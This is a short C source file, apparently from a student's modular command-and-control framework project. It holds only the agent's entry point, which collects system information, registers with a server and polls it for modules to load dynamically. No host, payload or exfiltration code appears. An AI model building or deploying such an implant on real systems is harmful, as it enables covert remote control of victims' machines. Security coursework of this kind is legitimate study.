/*
 * ============================================================
 *  main.c - Point d'entree de l'agent C2 minimal
 *
 *  Contient UNIQUEMENT :
 *    - Initialisation plateforme
 *    - Collecte des infos systeme
 *    - Boucle register > poll_loop
 *
 *  Aucun module built-in. Toutes les fonctionnalites sont
 *  chargees dynamiquement depuis le serveur a la demande.
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire - PFE INPT 2026
 * ============================================================
 */
#include "platform.h"
#include "config.h"
#include "utils.h"
#include "core.h"


int main(void) {

    /* ?? Initialisation plateforme ???????????????????????????? */
#ifdef PLATFORM_WINDOWS
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
#endif
#ifdef PLATFORM_LINUX
    curl_global_init(CURL_GLOBAL_DEFAULT);
#endif

    srand((unsigned int)time(NULL));

    /* ?? Collecte des informations systeme ???????????????????? */
    SystemInfo si;
    collect_system_info(&si);

    /* ?? Contexte de l'agent ?????????????????????????????????? */
    AgentContext ctx = {0};
    ctx.running = 1;

    printf("[*] Agent C2 minimal - %s\n", si.os);
    printf("[*] Aucun module built-in - chargement dynamique uniquement\n");

    /* ?? Boucle principale : enregistrement > polling ?????????? */
    while (ctx.running) {
        if (ctx.agent_id[0] == '\0') {
            if (!register_agent(&ctx, &si)) break;
        }
        poll_loop(&ctx, &si);
    }

    /* ?? Nettoyage ???????????????????????????????????????????? */
#ifdef PLATFORM_LINUX
    curl_global_cleanup();
#endif
    return 0;
}
